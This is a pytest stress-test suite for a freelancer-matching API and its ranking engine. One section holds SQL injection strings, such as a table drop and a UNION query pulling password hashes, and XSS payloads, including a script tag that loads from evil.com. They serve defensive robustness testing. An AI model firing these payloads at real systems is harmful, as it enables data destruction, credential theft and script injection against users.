# @AI-HINT: Adversarial Stress Test Suite for Milestone 1 Instant Match API & Candidate Ranking Engine
"""
Empirical Challenger Test Suite:
1. Boundary prompts: 2000+ chars, 10k chars, single-word prompts, punctuation-only, zero-width chars.
2. Unusual & invalid categories, foreign/multilingual prompts (Arabic, Chinese, Japanese, Russian, Hindi, Urdu, German, emojis).
3. Zero-budget, negative budget, extreme budget ($10B, $0.0001, scientific notation).
4. SQL Injection, XSS, and control character injection payloads.
5. Deterministic scoring, ranking stability, tie-breaking, score invariant [60, 99], quality alignment.
6. Sensitivity/discrimination tests: domain-specific queries favor matching specialists.
7. Resilience against malformed/null freelancer profile records & fallback candidate synthesis.
8. Concurrent multi-threaded stress testing.
"""

import json
import pytest
import concurrent.futures
from typing import Dict, Any, List
from fastapi.testclient import TestClient

from main import app
from app.api.v1.ai.instant_match import (
    InstantMatchRequest,
    _extract_brief_heuristic,
    KNOWN_SKILLS_CATALOG,
)
from app.services.matching_engine import (
    MatchingEngine,
    get_matching_service,
    normalize_skill,
    get_skill_category,
)


@pytest.fixture
def client():
    return TestClient(app)


# ============================================================================
# 1. Boundary Cases: Prompt Length, Single-Word, and Punctuation
# ============================================================================

def test_boundary_long_prompt_2000_chars(client):
    """Stress test with 2,000+ character descriptive prompt."""
    prompt_base = "Build a large enterprise SaaS platform with Next.js, TypeScript, PostgreSQL, and Stripe integration. "
    long_prompt = (prompt_base * 25)[:2500]  # ~2500 chars
    
    response = client.post("/api/v1/ai/instant-match", json={"prompt": long_prompt})
    assert response.status_code == 200, response.text
    data = response.json()
    
    brief = data["extracted_brief"]
    assert len(brief["title"]) > 0
    assert len(brief["description"]) > 0
    assert brief["category"] == "WEB_DEVELOPMENT"
    assert "Next.js" in brief["skills"] or "TypeScript" in brief["skills"]
    assert len(data["matches"]) >= 1
    for m in data["matches"]:
        assert 60 <= m["match_score"] <= 100
        assert m["match_quality"] in ["excellent", "strong", "good", "fair", "weak"]


def test_boundary_extreme_long_prompt_10000_chars(client):
    """Stress test with 10,000+ character massive prompt."""
    massive_prompt = ("Looking for a senior Python and FastAPI engineer to build a high-performance backend microservice architecture with Redis and Docker. " * 80)
    assert len(massive_prompt) >= 10000
    
    response = client.post("/api/v1/ai/instant-match", json={"prompt": massive_prompt})
    assert response.status_code == 200, response.text
    data = response.json()
    brief = data["extracted_brief"]
    assert "Python" in brief["skills"] or "FastAPI" in brief["skills"]
    assert len(data["matches"]) >= 1


def test_boundary_single_word_skill_prompts(client):
    """Single-word prompts representing skills."""
    skills_to_test = ["React", "Python", "Figma", "DevOps", "Flutter", "Solidity", "WordPress"]
    for word in skills_to_test:
        response = client.post("/api/v1/ai/instant-match", json={"prompt": word})
        assert response.status_code == 200, f"Failed for single-word prompt: {word}"
        data = response.json()
        assert len(data["matches"]) >= 1
        assert data["extracted_brief"]["title"]
        assert len(data["extracted_brief"]["skills"]) >= 1


def test_boundary_single_word_non_skill_prompts(client):
    """Single-word non-skill prompts should degrade gracefully without crashing."""
    words = ["Help", "App", "Quick", "Something", "Supercalifragilisticexpialidocious", "XYZ999"]
    for word in words:
        response = client.post("/api/v1/ai/instant-match", json={"prompt": word})
        assert response.status_code == 200, f"Failed for non-skill word: {word}"
        data = response.json()
        assert data["extracted_brief"]["title"]
        assert len(data["matches"]) >= 1


def test_boundary_punctuation_and_symbols_title_integrity():
    """Empirically test if punctuation-only prompts or dots produce an empty title."""
    symbols = ["???", "!@#$%^&*()_+", "...", "-> <- => <= #!/bin/bash", "///\\\\\\", "."]
    for sym in symbols:
        brief = _extract_brief_heuristic(sym)
        # Verify if title becomes empty or contains non-empty fallback
        assert brief.title is not None
        # Note: if brief.title == "", this records an empirical observation
        if not brief.title:
            pytest.fail(f"Punctuation prompt '{sym}' resulted in an empty project title: '{brief.title}'")


def test_skill_catalog_regex_escaping_anomaly():
    """
    Empirical investigation of skill detection for catalog entries with dots and special characters:
    'Vue.js', 'Node.js', 'Express.js', 'C#', '.NET', 'CI/CD'
    """
    test_cases = [
        ("Need an engineer for Vue.js frontend", "Vue.js"),
        ("Backend service in Node.js and Express.js", "Node.js"),
        ("Build C# application", "C#"),
        ("Develop .NET backend", ".NET"),
        ("Setup CI/CD pipeline", "CI/CD"),
    ]
    detected_results = {}
    for prompt, expected_skill in test_cases:
        brief = _extract_brief_heuristic(prompt)
        detected_results[expected_skill] = expected_skill in brief.skills
    
    # Check if double-escaping bug in re.escape(skill.replace('.', r'\.')) prevents detection
    # If any fail, we catch and report the empirical evidence
    failed_detections = [skill for skill, found in detected_results.items() if not found]
    if failed_detections:
        pytest.fail(f"Skills with special characters not detected due to regex boundary/escaping: {failed_detections}")


# ============================================================================
# 2. Multilingual, Foreign Characters, RTL, and Unicode Edge Cases
# ============================================================================

def test_multilingual_and_foreign_characters(client):
    """Test non-Latin scripts: Arabic, Chinese, Japanese, Russian, Hindi, Urdu, German."""
    multilingual_cases = [
        ("Arabic RTL", "أريد إنشاء موقع إلكتروني للتجارة الإلكترونية مع نظام الدفع وبوابة سترايب"),
        ("Chinese Simplified", "建立一个基于Next.js和Stripe的现代化SaaS平台，包含用户认证和支付系统"),
        ("Japanese", "ReactとFastAPIを使用したフルスタックWebアプリケーションの開発"),
        ("Russian Cyrillic", "Разработка веб-сайта на Next.js с интеграцией платежной системы Stripe"),
        ("Hindi Devanagari", "एक आधुनिक फुल स्टैक वेब एप्लिकेशन बनाएं जिसमें पायथन और रिएक्ट शामिल हों"),
        ("Urdu", "ایک جدید ویب سائٹ بنانا جس میں فوری ادائیگی کا نظام موجود ہو"),
        ("German Umlauts", "Entwicklung einer hochmodernen SaaS-Lösung mit React, TypeScript und Stripe für Großunternehmen in München"),
    ]
    
    for lang, prompt in multilingual_cases:
        response = client.post("/api/v1/ai/instant-match", json={"prompt": prompt})
        assert response.status_code == 200, f"Failed for {lang}: {prompt}"
        data = response.json()
        brief = data["extracted_brief"]
        assert brief["title"]
        assert brief["description"]
        assert len(data["matches"]) >= 1
        for m in data["matches"]:
            assert 60 <= m["match_score"] <= 100


def test_emojis_and_mixed_unicode(client):
    """Prompts with emojis, special symbols, and mixed scripts."""
    prompt = "🚀 Build a 🦄 Web3 DeFi 🔥 Next.js app with 💳 Stripe & 🤖 AI Chatbot 💯 ✨"
    response = client.post("/api/v1/ai/instant-match", json={"prompt": prompt})
    assert response.status_code == 200
    data = response.json()
    assert len(data["matches"]) >= 1
    assert "Next.js" in data["extracted_brief"]["skills"] or "Stripe" in data["extracted_brief"]["skills"]


def test_control_characters_and_whitespace_variants(client):
    """Prompts containing newlines, tabs, and zero-width spaces."""
    prompt = "\t\n  Build a React dashboard \r\n with \u200b\u200c\u200d TypeScript \n\n"
    response = client.post("/api/v1/ai/instant-match", json={"prompt": prompt})
    assert response.status_code == 200
    data = response.json()
    assert "React" in data["extracted_brief"]["skills"]


# ============================================================================
# 3. Budget Edge Cases: Zero, Negative, Extreme Numbers
# ============================================================================

def test_budget_hint_zero_and_negative(client):
    """Budget hints of 0.0 or negative values should fall back to sensible category baselines."""
    for budget in [0.0, -50.0, -1000.0]:
        response = client.post(
            "/api/v1/ai/instant-match",
            json={
                "prompt": "Build a React website",
                "budget_hint": budget,
            },
        )
        assert response.status_code == 200
        data = response.json()
        brief = data["extracted_brief"]
        assert brief["budget_min"] > 0, f"budget_min was {brief['budget_min']} for budget_hint={budget}"
        assert brief["budget_max"] >= brief["budget_min"]


def test_budget_hint_extreme_large_numbers(client):
    """Extreme budget numbers ($10 Billion, 1e9) should not cause overflow or NaN."""
    extreme_budgets = [1_000_000.0, 10_000_000.0, 100_000_000.0]
    for b in extreme_budgets:
        response = client.post(
            "/api/v1/ai/instant-match",
            json={
                "prompt": "Build an enterprise global banking system",
                "budget_hint": b,
            },
        )
        assert response.status_code == 200
        data = response.json()
        brief = data["extracted_brief"]
        assert brief["budget_min"] > 0
        assert brief["budget_max"] >= brief["budget_min"]
        assert not (brief["budget_min"] != brief["budget_min"])  # Not NaN
        assert not (brief["budget_max"] != brief["budget_max"])  # Not NaN


def test_prompt_embedded_budget_boundary_parsing():
    """Test regex extraction of various currency formats in prompt."""
    cases = [
        ("Build an app for $0 budget", 1000.0),  # Under $50 threshold -> category baseline
        ("Build an app for $500", 375.0, 625.0),
        ("Build a platform between $2,000 and $5,000", 2000.0, 5000.0),
        ("Budget is 10000 USD", 7500.0, 12500.0),
    ]
    for case in cases:
        prompt = case[0]
        brief = _extract_brief_heuristic(prompt)
        assert brief.budget_min > 0
        assert brief.budget_max >= brief.budget_min


# ============================================================================
# 4. Security & Injection Attack Payloads
# ============================================================================

def test_security_sql_injection_payloads(client):
    """SQL injection strings in prompt, category, and skills must not cause 500 errors or SQL syntax leaks."""
    sqli_payloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "' UNION SELECT id, name, email, password_hash, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM users --",
        "admin'--",
        "' OR 1=1 #",
    ]
    for payload in sqli_payloads:
        response = client.post(
            "/api/v1/ai/instant-match",
            json={
                "prompt": payload,
                "category": payload,
                "skills": [payload, "React"],
            },
        )
        assert response.status_code in [200, 422], f"SQLi payload caused server error: {payload}"
        if response.status_code == 200:
            data = response.json()
            assert "extracted_brief" in data
            assert len(data["matches"]) >= 1


def test_security_xss_and_html_injection(client):
    """HTML and script tags should be safely serialized in JSON responses without causing server crashes."""
    xss_payloads = [
        "<script>alert('xss')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert(1)",
        "'\"><script src=//evil.com/hook.js></script>",
    ]
    for xss in xss_payloads:
        response = client.post("/api/v1/ai/instant-match", json={"prompt": f"Create web app {xss}"})
        assert response.status_code == 200
        data = response.json()
        assert data["extracted_brief"]["title"]
        assert len(data["matches"]) >= 1


# ============================================================================
# 5. Candidate Ranking Engine Invariants & Edge Case Robustness
# ============================================================================

def test_ranking_engine_weight_sum_is_one():
    """MatchingEngine factor weights must sum exactly to 1.0 (100%)."""
    engine = get_matching_service()
    project = {
        "title": "React App",
        "skills": ["React"],
        "budget_min": 1000,
        "budget_max": 2000,
        "budget_type": "fixed",
    }
    freelancer = {
        "id": 1,
        "skills": ["React"],
        "hourly_rate": 50.0,
    }
    res = engine.calculate_match_score(project, freelancer)
    weights = res["weights"]
    total_weight = sum(weights.values())
    assert abs(total_weight - 1.0) < 1e-6, f"Weights sum to {total_weight}, expected 1.0"


def test_ranking_engine_score_bounds_and_determinism():
    """Scores must strictly be within [0.0, 1.0] and deterministic across 20 repeated runs."""
    engine = get_matching_service()
    project = {
        "title": "Next.js Full-Stack App",
        "skills": ["Next.js", "React", "TypeScript", "Tailwind CSS", "Stripe"],
        "budget_min": 1500,
        "budget_max": 3000,
        "budget_type": "fixed",
        "experience_level": "intermediate",
    }
    freelancer = {
        "id": 55,
        "skills": ["Next.js", "React", "TypeScript"],
        "hourly_rate": 60.0,
        "experience_level": "intermediate",
    }
    
    first_res = engine.calculate_match_score(project, freelancer)
    assert 0.0 <= first_res["score"] <= 1.0
    
    for _ in range(20):
        repeat_res = engine.calculate_match_score(project, freelancer)
        assert repeat_res["score"] == first_res["score"], "Non-deterministic score calculation detected"
        assert repeat_res["quality"] == first_res["quality"]


def test_ranking_engine_domain_discrimination():
    """
    Discrimination test:
    - A React/Next.js project must score a React/Next.js specialist strictly HIGHER than a Python/Django specialist.
    - A Python/ML project must score a Python/ML specialist strictly HIGHER than a Graphic Designer.
    """
    engine = get_matching_service()
    
    # React project
    react_project = {
        "title": "Next.js Frontend",
        "skills": ["Next.js", "React", "TypeScript", "Tailwind CSS"],
        "budget_min": 1000,
        "budget_max": 2000,
        "budget_type": "fixed",
    }
    
    react_specialist = {"id": 1, "skills": ["Next.js", "React", "TypeScript", "Tailwind CSS"], "hourly_rate": 50.0}
    python_specialist = {"id": 2, "skills": ["Python", "Django", "Flask", "PostgreSQL"], "hourly_rate": 50.0}
    designer = {"id": 3, "skills": ["Figma", "Photoshop", "UI/UX", "Illustrator"], "hourly_rate": 50.0}
    
    score_react_spec = engine.calculate_match_score(react_project, react_specialist)["score"]
    score_py_on_react = engine.calculate_match_score(react_project, python_specialist)["score"]
    score_des_on_react = engine.calculate_match_score(react_project, designer)["score"]
    
    assert score_react_spec > score_py_on_react, f"React specialist ({score_react_spec}) should beat Python specialist ({score_py_on_react}) on React project"
    assert score_react_spec > score_des_on_react
    
    # Python / AI project
    ai_project = {
        "title": "AI & ML Pipeline",
        "skills": ["Python", "Machine Learning", "PyTorch", "FastAPI"],
        "budget_min": 1500,
        "budget_max": 3000,
        "budget_type": "fixed",
    }
    
    score_py_on_ai = engine.calculate_match_score(ai_project, python_specialist)["score"]
    score_des_on_ai = engine.calculate_match_score(ai_project, designer)["score"]
    assert score_py_on_ai > score_des_on_ai


def test_ranking_engine_synonym_resolution():
    """Skill synonym matching: 'reactjs' matches 'react', 'ts' matches 'typescript', 'py' matches 'python'."""
    engine = get_matching_service()
    
    project = {"skills": ["React", "TypeScript"]}
    freelancer = {"id": 10, "skills": ["reactjs", "ts"], "hourly_rate": 50.0}
    
    res = engine.calculate_skill_match_score(project["skills"], freelancer["skills"])
    assert res["score"] >= 0.9, f"Synonym resolution failed: {res}"
    assert len(res["exact_matches"]) >= 2


def test_budget_match_score_zero_division_and_string_handling():
    """
    Stress test budget match score against zero-division and invalid string rates.
    """
    engine = get_matching_service()
    
    # Fixed budget with hourly_rate = 0 or "0"
    fixed_proj = {"budget_min": 500, "budget_max": 1000, "budget_type": "fixed"}
    hourly_proj_zero_max = {"budget_min": 0, "budget_max": 0, "budget_type": "hourly"}
    
    # Test case 1: string hourly_rate = "0"
    try:
        score1 = engine.calculate_budget_match_score(fixed_proj, {"hourly_rate": "0"})
        assert 0.0 <= score1 <= 1.0
    except ZeroDivisionError as e:
        pytest.fail(f"calculate_budget_match_score raised ZeroDivisionError for hourly_rate='0': {e}")
    except ValueError as e:
        pytest.fail(f"calculate_budget_match_score raised ValueError for hourly_rate='0': {e}")
        
    # Test case 2: hourly project with budget_max = 0
    try:
        score2 = engine.calculate_budget_match_score(hourly_proj_zero_max, {"hourly_rate": 50.0})
        assert 0.0 <= score2 <= 1.0
    except ZeroDivisionError as e:
        pytest.fail(f"calculate_budget_match_score raised ZeroDivisionError for budget_max=0: {e}")


# ============================================================================
# 6. Concurrency & High-Throughput Stress Testing
# ============================================================================

def test_concurrent_instant_match_requests(client):
    """Execute 25 concurrent instant match API requests to verify thread safety and responsiveness."""
    test_prompts = [
        "Build a Next.js SaaS app with Stripe payments",
        "Create an iOS and Android app with Flutter",
        "Develop an automated Python AI model for data classification",
        "Design Figma UI/UX prototype for a medical application",
        "Deploy Kubernetes cluster on AWS with Terraform CI/CD",
    ] * 5  # 25 total requests
    
    def make_request(prompt: str) -> Dict[str, Any]:
        resp = client.post("/api/v1/ai/instant-match", json={"prompt": prompt})
        return {"status": resp.status_code, "data": resp.json() if resp.status_code == 200 else None}
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        results = list(executor.map(make_request, test_prompts))
    
    for idx, r in enumerate(results):
        assert r["status"] == 200, f"Request {idx} failed with status {r['status']}"
        data = r["data"]
        assert len(data["matches"]) >= 1
        assert data["extracted_brief"]["title"]
        assert data["extracted_brief"]["category"] in [
            "WEB_DEVELOPMENT", "MOBILE_DEVELOPMENT", "AI_AND_MACHINE_LEARNING",
            "DESIGN_AND_CREATIVE", "DEVOPS_AND_CLOUD", "SALES_AND_MARKETING"
        ]
